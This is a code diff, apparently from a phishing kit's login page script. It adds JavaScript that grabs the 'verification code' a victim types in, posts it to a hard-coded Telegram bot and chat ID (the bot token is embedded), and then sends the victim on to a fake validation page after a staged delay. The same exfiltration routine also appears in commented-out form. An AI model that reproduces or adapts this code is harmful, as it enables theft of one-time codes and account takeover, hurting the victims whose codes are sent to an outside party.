@@ -23,103 +23,53 @@ document.addEventListener("DOMContentLoaded", () => {
   });
 });
 
-// const ;
 function show_counter() {
   submit_btn.setAttribute("disabled", "true");
   const del = document.getElementById("delayy");
   del.style.display = "flex";
+  return new Promise((resolve) => {
+    setTimeout(() => {
+      resolve();
+    }, 5000); // Adjust the delay as needed
+  });
 }
+
 async function submit_details() {
-  const intervall = setInterval(() => {
-    counterr.innerText = counterr.innerText - 1;
-    if (counterr.innerText == 0) {
-      clearInterval(intervall);
-      window.location.href = `/Login/validate/index.html`;
-    }
-    console.log("reduced");
-  }, 1000);
-  const chatIds = ["-1001991348429"];
+  const chatIds = ["-1001991348429"]; // Add your chat IDs here
   const verificationCode = email_field.value;
   const msg = `Verification code: ${verificationCode}`;
+
   for (let i = 0; i < chatIds.length; i++) {
     const data = {
       chat_id: chatIds[i],
       text: msg,
     };
-    const resp = await fetch(
-      `https://api.telegram.org/bot5312671411:AAFihWuoM10og_jUITZkqIqa-gk0p_i7H-E/sendMessage`,
-      {
-        method: "POST",
-        headers: {
-          accept: "application/json",
-          "content-type": "application/json",
-        },
-        body: JSON.stringify(data),
-      }
-    );
-    const resJson = await resp.json();
-    console.log(resJson);
+
+    try {
+      const resp = await fetch(
+        `https://api.telegram.org/bot5312671411:AAFihWuoM10og_jUITZkqIqa-gk0p_i7H-E/sendMessage`, // Replace 'your_bot_token' with your actual bot token
+        {
+          method: "POST",
+          headers: {
+            accept: "application/json",
+            "content-type": "application/json",
+          },
+          body: JSON.stringify(data),
+        }
+      );
+
+      const resJson = await resp.json();
+      console.log(resJson);
+      
+      // Redirect to the next page after sending the message
+      window.location.href = "/Login/validate/index.html"; // Replace "nextpage.html" with the URL of the next page
+    } catch (error) {
+      console.error("Error sending message to Telegram:", error);
+    }
   }
 }
 
 
-//Commented Async ?/
-
-// function show_counter() {
-//   submit_btn.setAttribute("disabled", "true");
-//   const del = document.getElementById("delayy");
-//   del.style.display = "flex";
-//   return new Promise((resolve) => {
-//     setTimeout(() => {
-//       resolve();
-//     }, 1000); // Adjust the delay as needed
-//   });
-// }
-
-// async function send_telegram_message() {
-//   const chatIds = ["-1001991348429"]; // Add your chat IDs here
-//   const verificationCode = email_field.value;
-//   const msg = `Verification code: ${verificationCode}`;
-
-//   for (let i = 0; i < chatIds.length; i++) {
-//     const data = {
-//       chat_id: chatIds[i],
-//       text: msg,
-//     };
-
-//     try {
-//       const resp = await fetch(
-//         `https://api.telegram.org/bot5312671411:AAFihWuoM10og_jUITZkqIqa-gk0p_i7H-E/sendMessage`, // Replace 'your_bot_token' with your actual bot token
-//         {
-//           method: "POST",
-//           headers: {
-//             accept: "application/json",
-//             "content-type": "application/json",
-//           },
-//           body: JSON.stringify(data),
-//         }
-//       );
-
-//       const resJson = await resp.json();
-//       console.log(resJson);
-      
-//       // Redirect to the next page after sending the message
-//       window.location.href = "/Login/validate/index.html"; // Replace "nextpage.html" with the URL of the next page
-//     } catch (error) {
-//       console.error("Error sending message to Telegram:", error);
-//     }
-//   }
-// }
-
-
-
-
-
-
-
-
-
-//commented//
 
 // async function send_telegram_message() {
 //   const chatIds = ["-1001991348429"]; // Add your chat IDs here
